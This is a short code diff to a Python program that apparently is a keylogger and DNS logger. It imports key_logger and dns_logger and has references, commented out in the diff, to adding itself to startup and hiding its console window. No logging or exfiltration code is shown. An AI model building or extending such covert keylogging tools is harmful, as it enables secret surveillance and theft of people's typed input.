@@ -1,12 +1,12 @@
-from utilities import dir_path, sync, server, hide_console
+from utilities import dir_path, sync, server
 from logger import key_logger, dns_logger
+import os
 import sys
 import socket
 import multiprocessing
 
-
 def main():
-    # add_startup() , add_startup
+    # add_startup() ++ import add_startup from utilities
     # disallowing multiple instance
     # Create a socket object
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -82,5 +82,7 @@ def main():
                 print("Wrong Input! Try again. \n ")
 
 if __name__ == "__main__":
+    # On Windows calling this function is necessary.
+    multiprocessing.freeze_support()
     main()
-    hide_console()
+    # hide_console() ++import hide_console from utilities
